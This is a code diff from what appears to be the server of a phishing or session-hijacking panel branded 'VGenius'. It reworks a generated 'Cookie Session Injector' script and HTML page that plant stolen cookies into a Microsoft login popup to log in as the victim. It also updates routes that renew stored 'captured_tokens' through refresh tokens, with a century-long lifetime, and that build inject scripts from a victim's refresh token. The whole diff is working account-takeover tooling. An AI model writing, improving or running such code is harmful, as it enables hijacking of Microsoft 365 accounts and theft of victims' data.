@@ -218,45 +218,59 @@ function generatePopupScript(cookies) {
   var cookieJson = JSON.stringify(cookies);
 
   var script = '(function(){\n';
-  script += '  // Open popup to Microsoft login domain\n';
+  script += '  var cookies = ' + cookieJson + ';\n';
+  script += '  var expStr = "' + expStr + '";\n';
+  script += '\n';
+  script += '  // Open popup FIRST\n';
   script += '  var popup = window.open(\n';
-  script += '    \'https://login.microsoftonline.com/common/oauth2/authorize\',\n';
-  script += '    \'vgenius_inject\',\n';
-  script += '    \'width=600,height=800\'\n';
+  script += '    "https://login.microsoftonline.com/common/oauth2/authorize",\n';
+  script += '    "vgenius_inject",\n';
+  script += '    "width=800,height=600,scrollbars=yes"\n';
   script += '  );\n';
   script += '\n';
   script += '  if (!popup) {\n';
-  script += '    alert(\'Popup blocked! Please allow popups for this site.\');\n';
+  script += '    alert("Popup blocked! Please allow popups for this site.");\n';
   script += '    return;\n';
   script += '  }\n';
   script += '\n';
-  script += '  // Wait for popup to load then inject cookies\n';
-  script += '  var checkInterval = setInterval(function() {\n';
+  script += '  // Wait for popup to fully load (2 seconds)\n';
+  script += '  setTimeout(function() {\n';
   script += '    try {\n';
-  script += '      var cookies = ' + cookieJson + ';\n';
+  script += '      // Get the popup\'s document context\n';
+  script += '      var popupDoc = popup.document;\n';
+  script += '\n';
+  script += '      // Set each cookie directly on the popup document\n';
   script += '      for (var i = 0; i < cookies.length; i++) {\n';
   script += '        var c = cookies[i];\n';
-  script += '        var domain = c.domain || \'.login.microsoftonline.com\';\n';
-  script += '        popup.document.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
-  script += '          + "; domain=" + domain\n';
-  script += '          + "; expires=' + expStr + '";\n';
-  script += '        popup.document.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
-  script += '          + "; domain=" + domain + "; path=/; SameSite=None; Secure";\n';
+  script += '        var domain = c.domain || ".login.microsoftonline.com";\n';
+  script += '        var cookieVal = encodeURIComponent(c.value);\n';
+  script += '        var setCookie = c.name + "=" + cookieVal;\n';
+  script += '        setCookie += "; domain=" + domain;\n';
+  script += '        setCookie += "; path=/";\n';
+  script += '        setCookie += "; SameSite=None";\n';
+  script += '        setCookie += "; Secure";\n';
+  script += '        setCookie += "; expires=" + expStr;\n';
+  script += '\n';
+  script += '        popupDoc.cookie = setCookie;\n';
   script += '      }\n';
   script += '\n';
-  script += '      // Redirect to trigger Microsoft authentication\n';
-  script += '      popup.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  script += '      clearInterval(checkInterval);\n';
-  script += '    } catch(e) {\n';
-  script += '      // Cross-origin error - keep trying\n';
-  script += '    }\n';
-  script += '  }, 200);\n';
+  script += '      // Verify cookies were set\n';
+  script += '      var allCookies = popupDoc.cookie;\n';
+  script += '      console.log("[VGenius] Cookies in popup: " + allCookies.length + " chars");\n';
   script += '\n';
-  script += '  // Timeout after 8 seconds\n';
-  script += '  setTimeout(function() {\n';
-  script += '    clearInterval(checkInterval);\n';
-  script += '    if (popup && !popup.closed) popup.close();\n';
-  script += '  }, 8000);\n';
+  script += '      // Now redirect to trigger authentication\n';
+  script += '      popup.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  script += '\n';
+  script += '      // Close popup after redirect is initiated\n';
+  script += '      setTimeout(function() {\n';
+  script += '        if (popup && !popup.closed) popup.close();\n';
+  script += '      }, 3000);\n';
+  script += '\n';
+  script += '    } catch(e) {\n';
+  script += '      alert("Error injecting cookies: " + e.message);\n';
+  script += '      if (popup && !popup.closed) popup.close();\n';
+  script += '    }\n';
+  script += '  }, 2000);\n';
   script += '})();';
 
   return script;
@@ -278,61 +292,81 @@ function generateStandaloneHtml(cookies) {
   html += '    button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
   html += '    button:hover { background: #00cca3; }\n';
   html += '    pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; font-size: 11px; }\n';
+  html += '    .status { margin-top: 10px; padding: 10px; border-radius: 4px; }\n';
+  html += '    .success { background: #0a3d0a; color: #0f0; }\n';
+  html += '    .error { background: #3d0a0a; color: #f00; }\n';
   html += '  </style>\n';
   html += '</head>\n<body>\n';
   html += '  <h1>VGenius Cookie Session Injector</h1>\n';
-  html += '  <p>1. Click the button below to open Microsoft login popup</p>\n';
-  html += '  <p>2. Cookies will be injected automatically</p>\n';
+  html += '  <p><strong>Step 1:</strong> Click the button below to open Microsoft login popup</p>\n';
+  html += '  <p><strong>Step 2:</strong> Allow popups when prompted</p>\n';
+  html += '  <p><strong>Step 3:</strong> Cookies are injected automatically after 2 seconds</p>\n';
   html += '  <button onclick="injectCookies()">Inject Cookies & Auto-Login</button>\n';
-  html += '  <button onclick="copyScript()">Copy Script</button>\n';
-  html += '  <pre id="script"></pre>\n';
+  html += '  <div id="status"></div>\n';
   html += '  <script>\n';
 
   // Build the actual injection function inline
   html += '    var cookies = ' + cookieJson + ';\n';
   html += '    var expStr = "' + expStr + '";\n';
+  html += '    var statusDiv = document.getElementById("status");\n';
+  html += '\n';
+  html += '    function setStatus(msg, type) {\n';
+  html += '      statusDiv.className = "status " + type;\n';
+  html += '      statusDiv.innerHTML = msg;\n';
+  html += '    }\n';
   html += '\n';
   html += '    function injectCookies() {\n';
+  html += '      setStatus("Opening popup...", "success");\n';
+  html += '\n';
   html += '      var popup = window.open(\n';
   html += '        "https://login.microsoftonline.com/common/oauth2/authorize",\n';
   html += '        "vgenius_inject",\n';
-  html += '        "width=600,height=800"\n';
+  html += '        "width=800,height=600,scrollbars=yes"\n';
   html += '      );\n';
   html += '\n';
   html += '      if (!popup) {\n';
-  html += '        alert("Popup blocked! Please allow popups.");\n';
+  html += '        setStatus("Popup blocked! Please allow popups for this site.", "error");\n';
   html += '        return;\n';
   html += '      }\n';
   html += '\n';
-  html += '      var checkInterval = setInterval(function() {\n';
+  html += '      // Wait 2 seconds for popup to load, then inject\n';
+  html += '      setTimeout(function() {\n';
   html += '        try {\n';
+  html += '          var popupDoc = popup.document;\n';
+  html += '\n';
+  html += '          // Set each cookie directly on the popup document\n';
   html += '          for (var i = 0; i < cookies.length; i++) {\n';
   html += '            var c = cookies[i];\n';
-  html += '            var d = c.domain || ".login.microsoftonline.com";\n';
-  html += '            popup.document.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
-  html += '              + "; domain=" + d + "; expires=" + expStr + "; path=/; SameSite=None; Secure";\n';
+  html += '            var domain = c.domain || ".login.microsoftonline.com";\n';
+  html += '            var cookieVal = encodeURIComponent(c.value);\n';
+  html += '            var setCookie = c.name + "=" + cookieVal;\n';
+  html += '            setCookie += "; domain=" + domain;\n';
+  html += '            setCookie += "; path=/";\n';
+  html += '            setCookie += "; SameSite=None";\n';
+  html += '            setCookie += "; Secure";\n';
+  html += '            setCookie += "; expires=" + expStr;\n';
+  html += '\n';
+  html += '            popupDoc.cookie = setCookie;\n';
   html += '          }\n';
+  html += '\n';
+  html += '          // Verify cookies were set\n';
+  html += '          var allCookies = popupDoc.cookie;\n';
+  html += '          setStatus("Injected ' + cookies.length + ' cookies! Redirecting to Microsoft login...", "success");\n';
+  html += '\n';
+  html += '          // Now redirect to trigger authentication\n';
   html += '          popup.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  html += '          clearInterval(checkInterval);\n';
-  html += '          alert("Cookies injected! You should be logged in.");\n';
-  html += '        } catch(e) {}\n';
-  html += '      }, 200);\n';
   html += '\n';
-  html += '      setTimeout(function() {\n';
-  html += '        clearInterval(checkInterval);\n';
-  html += '        if (popup && !popup.closed) popup.close();\n';
-  html += '      }, 10000);\n';
+  html += '          // Close popup after redirect is initiated\n';
+  html += '          setTimeout(function() {\n';
+  html += '            if (popup && !popup.closed) popup.close();\n';
+  html += '          }, 3000);\n';
+  html += '\n';
+  html += '        } catch(e) {\n';
+  html += '          setStatus("Error: " + e.message, "error");\n';
+  html += '          if (popup && !popup.closed) popup.close();\n';
+  html += '        }\n';
+  html += '      }, 2000);\n';
   html += '    }\n';
-  html += '\n';
-  html += '    function copyScript() {\n';
-  html += '      var scriptText = document.getElementById("script").textContent;\n';
-  html += '      navigator.clipboard.writeText(scriptText).then(function() {\n';
-  html += '        alert("Script copied!");\n';
-  html += '      });\n';
-  html += '    }\n';
-  html += '\n';
-  html += '    // Display the script\n';
-  html += '    document.getElementById("script").textContent = "(See button above to inject)";\n';
   html += '  </script>\n';
   html += '</body>\n</html>';
 
@@ -474,22 +508,21 @@ router.post('/:id/renew', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'No tokens available for renewal' });
     }
 
-    // If we have a refresh token, use it to get new tokens directly
+    // Use refresh token for direct renewal (no popup needed)
     if (refreshToken) {
       try {
         const cookieConverter = require('../services/cookieconverter');
         const templateType = token.token_type === 'cookie' ? (token.template_type || 'office') : 'office';
+        const tokenTenant = token.tenant || config.AZURE_TENANT || 'common';
 
         const result = await cookieConverter.convertTokensToCookies(
-          refreshToken, templateType, token.tenant || 'common'
+          refreshToken, templateType, tokenTenant
         );
 
         if (result.success && result.cookies) {
           const ttlHours = 24 * 365 * 100;
           const newAccessToken = result.access_token || accessToken;
           const newRefreshToken = result.new_refresh_token || refreshToken;
-          const finalAccessToken = newAccessToken !== newRefreshToken ? newAccessToken : accessToken;
-          const finalRefreshToken = newRefreshToken;
 
           await db.query(
             `UPDATE captured_tokens
@@ -501,8 +534,8 @@ router.post('/:id/renew', userAuth, async (req, res) => {
             [
               encrypt(result.cookies),
               ttlHours,
-              encrypt(finalAccessToken),
-              encrypt(finalRefreshToken),
+              encrypt(newAccessToken),
+              encrypt(newRefreshToken),
               token.id
             ]
           );
@@ -600,7 +633,7 @@ router.get('/inject-script', userAuth, async (req, res) => {
     }
 
     const clientId = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
-    const tokenTenant = token.tenant || 'common';
+    const tokenTenant = token.tenant || config.AZURE_TENANT || 'common';
 
     const script = `(async function() {
       const refreshToken = "${realRefreshToken}";
